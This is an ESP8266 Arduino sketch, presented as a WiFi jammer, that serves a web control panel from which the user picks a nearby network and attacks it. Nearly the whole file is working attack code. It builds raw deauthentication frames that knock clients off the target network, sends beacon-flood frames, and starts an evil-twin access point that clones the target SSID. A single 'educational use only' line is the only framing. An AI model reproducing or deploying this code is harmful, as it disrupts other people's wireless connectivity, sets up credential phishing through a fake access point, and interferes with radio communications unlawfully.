/*
  WiFi Jammer using ESP8266
  -----------------------------------
  Created by: Sumit Kumar Chaturvedi
  Description: This project creates a web interface to launch
  deauthentication, beacon flooding, and evil twin attacks 
  via an ESP8266 board.
*/

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <FS.h>
extern "C" {
  #include "user_interface.h"
}

const char* ssid = "ESP_Jammer";
const char* password = "12345678";
ESP8266WebServer server(80);
bool attackRunning = false;
bool beaconFlooding = false;
bool evilTwin = false;
String targetSSID = "";
uint8_t targetMac[6];

void scanNetworks() {
  int numNetworks = WiFi.scanNetworks();
  Serial.println("Available Networks:");
  for (int i = 0; i < numNetworks; i++) {
    Serial.println(WiFi.SSID(i));
  }
}

bool getMACFromSSID(String ssid) {
  int numNetworks = WiFi.scanNetworks();
  for (int i = 0; i < numNetworks; i++) {
    if (WiFi.SSID(i) == ssid) {
      memcpy(targetMac, WiFi.BSSID(i), 6);
      Serial.println("Target MAC: " + WiFi.BSSIDstr(i));
      return true;
    }
  }
  return false;
}

void sendDeauth() {
  uint8_t deauthPacket[] = {
    0xC0, 0x00, 0x3A, 0x01,
    targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5],
    targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5],
    targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5],
    0xF0, 0xFF, 0x02, 0x00
  };

  for (int i = 0; i < 50; i++) {
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    delay(1);
  }
}

void sendBeaconFlood() {
  uint8_t beaconPacket[] = {
    0x80, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5],
    targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5],
    0x00, 0x00, 0x21, 0x00, 0x00, 0x00
  };

  for (int i = 0; i < 50; i++) {
    wifi_send_pkt_freedom(beaconPacket, sizeof(beaconPacket), 0);
    delay(1);
  }
}

void handleRoot() {
  String page = "<h1>Wi-Fi Jammer - Created by Sumit Kumar Chaturvedi</h1>";
  page += "<p>Available Networks:</p><ul>";
  int numNetworks = WiFi.scanNetworks();
  for (int i = 0; i < numNetworks; i++) {
    page += "<li><a href='/setTarget?ssid=" + WiFi.SSID(i) + "'>" + WiFi.SSID(i) + "</a></li>";
  }
  page += "</ul><p><a href='/start'>Start Attack</a> | <a href='/stop'>Stop Attack</a> | <a href='/beaconFlood'>Beacon Flood</a> | <a href='/evilTwin'>Evil Twin</a></p>";
  page += "<p><b>Note:</b> Works only on 2.4GHz Wi-Fi.<br> Not effective if MFP is enabled.<br> For educational use only.</p>";
  server.send(200, "text/html", page);
}

void handleStart() {
  if (targetSSID != "" && getMACFromSSID(targetSSID)) {
    attackRunning = true;
    server.send(200, "text/plain", "Attack Started on " + targetSSID);
    Serial.println("Starting Attack on " + targetSSID);
  } else {
    server.send(400, "text/plain", "Invalid SSID");
  }
}

void handleStop() {
  attackRunning = false;
  beaconFlooding = false;
  evilTwin = false;
  server.send(200, "text/plain", "Attack Stopped");
  Serial.println("Attack Stopped");
}

void handleBeaconFlood() {
  beaconFlooding = true;
  server.send(200, "text/plain", "Beacon Flood Attack Started");
  Serial.println("Beacon Flood Attack Started");
}

void handleEvilTwin() {
  evilTwin = true;
  WiFi.softAP(targetSSID.c_str(), "fakepass");
  server.send(200, "text/plain", "Evil Twin Attack Started");
  Serial.println("Evil Twin Attack Started: " + targetSSID);
}

void handleSetTarget() {
  if (server.hasArg("ssid")) {
    targetSSID = server.arg("ssid");
    server.send(200, "text/plain", "Target SSID Set: " + targetSSID);
    Serial.println("Target SSID: " + targetSSID);
  } else {
    server.send(400, "text/plain", "Missing SSID");
  }
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid, password);
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  scanNetworks();
  server.on("/", handleRoot);
  server.on("/start", handleStart);
  server.on("/stop", handleStop);
  server.on("/setTarget", handleSetTarget);
  server.on("/beaconFlood", handleBeaconFlood);
  server.on("/evilTwin", handleEvilTwin);
  server.begin();
  Serial.println("Web Control Panel Ready by Sumit Kumar Chaturvedi");
}

void loop() {
  server.handleClient();
  if (attackRunning) {
    sendDeauth();
  }
  if (beaconFlooding) {
    sendBeaconFlood();
  }
}
